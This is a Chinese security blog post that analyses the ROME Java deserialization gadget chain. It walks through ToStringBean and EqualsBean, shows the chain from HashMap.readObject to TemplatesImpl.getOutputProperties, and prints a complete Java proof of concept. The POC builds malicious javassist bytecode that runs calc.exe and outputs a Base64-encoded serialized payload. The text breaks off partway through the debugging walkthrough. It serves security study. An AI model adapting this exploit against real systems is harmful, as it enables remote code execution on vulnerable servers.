<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ROME攻击链分析 | stoocea's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('/img/pc-bg.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: '确认'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>ROME攻击链分析</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-03-31T15:50:00.000Z" id="date"> 2024-03-31</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-09T10:25:04.063Z" id="updated"> 2024-08-09</time></div></span></div></div><hr><div id="post-content"><h1 id="什么是-ROME"><a href="#什么是-ROME" class="headerlink" title="什么是 ROME"></a>什么是 ROME</h1><p>ROME 是一个关于 RSS 和 Atom 格式的 java 框架<br>那什么是 RSS 和 Atom 呢？<br>RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的<strong>格式</strong>,主要作用用在聚合多个网站的更新内容，并且能够自动通知网站订阅者。同时 RSS 能够以摘要的形式将信息呈现，帮助订阅者快速游览。（比如 bilibili 的动态？）<br>Atom 本身就是一个名词，它更加具体的名称是 Atom Syndication Format ，中文译为 Atom 供稿格式。Atom 的诞生是为了解决 RSS 在各个版本遇到的问题，降低 web 内容聚合的难度，特地特出来的一种信息格式。<br>RSS 的内容需要通过 RSS 阅读器查看，而 ROME 就是其中一个比较老的 RSS 阅读器了。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h1 id="ROME-组件分析"><a href="#ROME-组件分析" class="headerlink" title="ROME 组件分析"></a>ROME 组件分析</h1><h2 id="0x01-ToStringBean"><a href="#0x01-ToStringBean" class="headerlink" title="0x01 ToStringBean"></a>0x01 ToStringBean</h2><p>我们先看他的结构<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711786873166-a019c7bc-d699-4975-9a12-ce257828840a.png#averageHue=%233b3d42&clientId=u15358810-29f9-4&from=paste&height=250&id=u63d3cb84&originHeight=469&originWidth=914&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=146572&status=done&style=none&taskId=ubde9bbb4-d6f0-4d85-b719-670a43bb34c&title=&width=487.46666666666664'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711786873166-a019c7bc-d699-4975-9a12-ce257828840a.png#averageHue=%233b3d42&clientId=u15358810-29f9-4&from=paste&height=250&id=u63d3cb84&originHeight=469&originWidth=914&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=146572&status=done&style=none&taskId=ubde9bbb4-d6f0-4d85-b719-670a43bb34c&title=&width=487.46666666666664" referrerpolicy="no-referrer" alt="image.png"><br>然后理解一下这个类是用来干什么的？从名称我们可以得知，它主要作用是用来打印信息的，所有方法都是用来 print 和 toString。要想将目标类信息打印出来，首先就应该获取对应类信息，那获取对应类信息最直接的就是 get 方法了，这里获取类属性值就是通过对应类的 get 方法获取的<br>我们重点看 toString 方法<br>在 toString 有参方法中，它会接收一段 StringBuffer 参数（类字节码），在经过信息处理和特征获取后，他会经历一段 for 循环，用来循环遍历类中的 get 方法，并且在最后执行该 get 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787054097-4ccd24c4-3ba2-4d81-adfd-bebfe56681e1.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=542&id=uaa7f0ce5&originHeight=1016&originWidth=1913&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=568791&status=done&style=none&taskId=u93a43d16-186d-4912-b554-aa5793f13ad&title=&width=1020.2666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787054097-4ccd24c4-3ba2-4d81-adfd-bebfe56681e1.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=542&id=uaa7f0ce5&originHeight=1016&originWidth=1913&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=568791&status=done&style=none&taskId=u93a43d16-186d-4912-b554-aa5793f13ad&title=&width=1020.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>for 循环里面是通过<code>getReadMethod()</code>方法来获取 get 方法的<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787385126-fec8ca73-8f6f-400e-a327-601e9d82b751.png#averageHue=%232c2e33&clientId=u15358810-29f9-4&from=paste&height=484&id=u141c1995&originHeight=907&originWidth=1558&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=417497&status=done&style=none&taskId=ub2639b36-e651-4f05-b994-143866ca61d&title=&width=830.9333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787385126-fec8ca73-8f6f-400e-a327-601e9d82b751.png#averageHue=%232c2e33&clientId=u15358810-29f9-4&from=paste&height=484&id=u141c1995&originHeight=907&originWidth=1558&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=417497&status=done&style=none&taskId=ub2639b36-e651-4f05-b994-143866ca61d&title=&width=830.9333333333333" referrerpolicy="no-referrer" alt="image.png"><br>获取完 get 方法之后还会经过一层 if 的判断筛选，条件如下</p>
<blockquote>
<p>首先当前 get 方法数组的值不能为空<br>不能是 Object 父类的 get 方法<br>过滤有参数的 get 方法</p>
</blockquote>
<p>在经过这三层筛选之后，直接invoke 方法调用<br>与 toString 有参方法有联系的只有 toString 的无参方法了，我们的思路是能够通过调用 toString 无参方法间接去调用有参的 toString，或者直接调有参 toString 也行<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711788629306-882803d8-154c-45c1-b6ce-a24c1167f0bc.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=410&id=u6e2f484c&originHeight=768&originWidth=1718&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=415957&status=done&style=none&taskId=u0742d6f1-80e4-4894-8e4f-aa090ed7207&title=&width=916.2666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711788629306-882803d8-154c-45c1-b6ce-a24c1167f0bc.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=410&id=u6e2f484c&originHeight=768&originWidth=1718&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=415957&status=done&style=none&taskId=u0742d6f1-80e4-4894-8e4f-aa090ed7207&title=&width=916.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里最开始的思路是通过 hashMap CC6 那条链子起手，通过调用**EqualsBean **的 beanHashCode()方法，进一步调到 toString 无参方法</p>
<h2 id="0x02-EqualsBean"><a href="#0x02-EqualsBean" class="headerlink" title="0x02 EqualsBean"></a>0x02 EqualsBean</h2><p>他也能作为一段 ROME 链的最终触发点，也就是调用 get 方法<br>触发点在它的beanEquals 方法中，整体逻辑和 toStringBean 的 tosting 差不多，都是获取到 get 方法之后通过 invoke 调用，但由于他是 equals 方法的缘故，要两者进行比较，所以会两次调用 get 方法，来判断两者是否相等，这一点在我们之后分析它的攻击链时会用到<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png?x-oss-process=image/format,webp/resize,w_1406,limit_0#averageHue=%232b2e33&from=url&id=rANCe&originHeight=455&originWidth=1406&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711887018145-0ca29033-6849-4ae2-b5bb-269e2037a930.png?x-oss-process=image/format,webp/resize,w_1406,limit_0#averageHue=%232b2e33&from=url&id=rANCe&originHeight=455&originWidth=1406&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=" referrerpolicy="no-referrer"></p>
<h1 id="ROME-链流程分析"><a href="#ROME-链流程分析" class="headerlink" title="ROME 链流程分析"></a>ROME 链流程分析</h1><h2 id="0x01-ObjectBean利用链"><a href="#0x01-ObjectBean利用链" class="headerlink" title="0x01 ObjectBean利用链"></a>0x01 ObjectBean利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)<br>HashMap&lt;K,V&gt;.hash(Object)<br>ObjectBean.hashCode()<br>EqualsBean.hashCode()                  <br>EqualsBean.beanHashCode()<br>ToStringBean.toString()<br>ToStringBean.toString(String)<br>TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure>
<p>最后就是 fastjson 中最常见的通过getOutputProperties 链去加载字节码了<br>POC 如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//javassist写恶意字节码</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;i&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//配置ToStringBean中的_beanClass，指定要toString出的类</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templatesImpl);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean, <span class="hljs-string">&quot;x&quot;</span>);<br><br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_cloneableBean&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_toStringBean&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> unSerial(hashMap);<br>        <span class="hljs-comment">// 输出序列化的Base64编码字符</span><br>        Base64Encode(bs);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ByteArrayOutputStream <span class="hljs-title function_">unSerial</span><span class="hljs-params">(Map hashMap)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bs);<br>        out.writeObject(hashMap);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bs.toByteArray()));<br>        in.readObject();<br>        in.close();<br>        <span class="hljs-keyword">return</span> bs;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="1x01-流程分析"><a href="#1x01-流程分析" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>初步的断点打在 readObject 方法处<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791727777-633bb731-b27f-45cd-af08-5363bbc18912.png#averageHue=%232e3136&clientId=ufc9b3df2-ec82-4&from=paste&height=192&id=ubd80734a&originHeight=360&originWidth=1610&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=204041&status=done&style=none&taskId=u014d7ea5-67ab-4efa-ad9c-81d52033e86&title=&width=858.6666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791727777-633bb731-b27f-45cd-af08-5363bbc18912.png#averageHue=%232e3136&clientId=ufc9b3df2-ec82-4&from=paste&height=192&id=ubd80734a&originHeight=360&originWidth=1610&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=204041&status=done&style=none&taskId=u014d7ea5-67ab-4efa-ad9c-81d52033e86&title=&width=858.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>然后我们跟进其 readObject，很熟悉的流程，就不多做赘述了<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791777034-cf6027ed-83d3-45bd-8b59-c3b360ad21d1.png#averageHue=%232e3643&clientId=ufc9b3df2-ec82-4&from=paste&height=125&id=u95b122df&originHeight=235&originWidth=1941&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137148&status=done&style=none&taskId=ue3fe5b56-0abb-4b83-8b94-fec127dbba3&title=&width=1035.2'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791777034-cf6027ed-83d3-45bd-8b59-c3b360ad21d1.png#averageHue=%232e3643&clientId=ufc9b3df2-ec82-4&from=paste&height=125&id=u95b122df&originHeight=235&originWidth=1941&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137148&status=done&style=none&taskId=ue3fe5b56-0abb-4b83-8b94-fec127dbba3&title=&width=1035.2" referrerpolicy="no-referrer" alt="image.png"><br>后续直接跟进到 ObjectBean 的 hashCode<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791826291-da1ebd00-2f44-4c53-aa82-b8c890e0c52c.png#averageHue=%232b333f&clientId=ufc9b3df2-ec82-4&from=paste&height=161&id=u85f01e41&originHeight=302&originWidth=1503&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=139925&status=done&style=none&taskId=ud8e54ae2-3fcf-4c4e-8f89-7cd5d260307&title=&width=801.6'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791826291-da1ebd00-2f44-4c53-aa82-b8c890e0c52c.png#averageHue=%232b333f&clientId=ufc9b3df2-ec82-4&from=paste&height=161&id=u85f01e41&originHeight=302&originWidth=1503&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=139925&status=done&style=none&taskId=ud8e54ae2-3fcf-4c4e-8f89-7cd5d260307&title=&width=801.6" referrerpolicy="no-referrer" alt="image.png"><br>这里会调用到 equalsBean 的 beanHashCode()，继续跟进<br>由于刚才我们赋值的时候给 _obj 赋值上了构造好的 toStringBean，这里直接调 toStringBean 的无参 toString<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791931702-6cedc7d5-000d-4bff-99f1-05957aa7578b.png#averageHue=%23353c45&clientId=ufc9b3df2-ec82-4&from=paste&height=297&id=u297d8ccb&originHeight=556&originWidth=2014&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367320&status=done&style=none&taskId=ue7c90d87-4aed-4aeb-9bfd-4998c93d156&title=&width=1074.1333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711791931702-6cedc7d5-000d-4bff-99f1-05957aa7578b.png#averageHue=%23353c45&clientId=ufc9b3df2-ec82-4&from=paste&height=297&id=u297d8ccb&originHeight=556&originWidth=2014&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367320&status=done&style=none&taskId=ue7c90d87-4aed-4aeb-9bfd-4998c93d156&title=&width=1074.1333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这里直接一路跟到有参 toString 就行，先是通过 getPropertyDescriptors 方法获取到关于 TemplatesImpl 的包装类，然后通过包装类 pds 的 getReadMethod 方法获取所有的 get 方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792043116-f5010aff-79e0-4ded-8ee7-f1766114f870.png#averageHue=%2331363c&clientId=ufc9b3df2-ec82-4&from=paste&height=583&id=ubde17ded&originHeight=1094&originWidth=2049&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=822782&status=done&style=none&taskId=ucece8013-f250-4464-b1d7-4e48ae3202a&title=&width=1092.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792043116-f5010aff-79e0-4ded-8ee7-f1766114f870.png#averageHue=%2331363c&clientId=ufc9b3df2-ec82-4&from=paste&height=583&id=ubde17ded&originHeight=1094&originWidth=2049&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=822782&status=done&style=none&taskId=ucece8013-f250-4464-b1d7-4e48ae3202a&title=&width=1092.8" referrerpolicy="no-referrer" alt="image.png"><br>这里第一个就是获取 getOutputProperties 方法<br>返回之后开始调用，直接跟进 invoke<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792290065-00b78ce1-20e2-47b2-aefe-cf57d6201b47.png#averageHue=%232c3037&clientId=ufc9b3df2-ec82-4&from=paste&height=323&id=ua4ec5968&originHeight=606&originWidth=1462&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=334103&status=done&style=none&taskId=u30e897d5-9c0f-4ee6-94c3-15139e690cf&title=&width=779.7333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792290065-00b78ce1-20e2-47b2-aefe-cf57d6201b47.png#averageHue=%232c3037&clientId=ufc9b3df2-ec82-4&from=paste&height=323&id=ua4ec5968&originHeight=606&originWidth=1462&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=334103&status=done&style=none&taskId=u30e897d5-9c0f-4ee6-94c3-15139e690cf&title=&width=779.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>跟进到 TemplateImpl 的getOutputProperties 方法，这里会调用 newTransformer()方法<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1711792322356-669021ca-be3b-42d5-82a7-494f49288521.png#averageHue=%232d333d&clientId=ufc9b3df2-ec82-4&from=paste&height=220&id=u531850fb&originHeight=412&originWidth=1260&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=174881&status=done&style=none&taskId=u88745025-7de9-40b3-a0f5-8fd0a6792b2&title=&width=672'><img 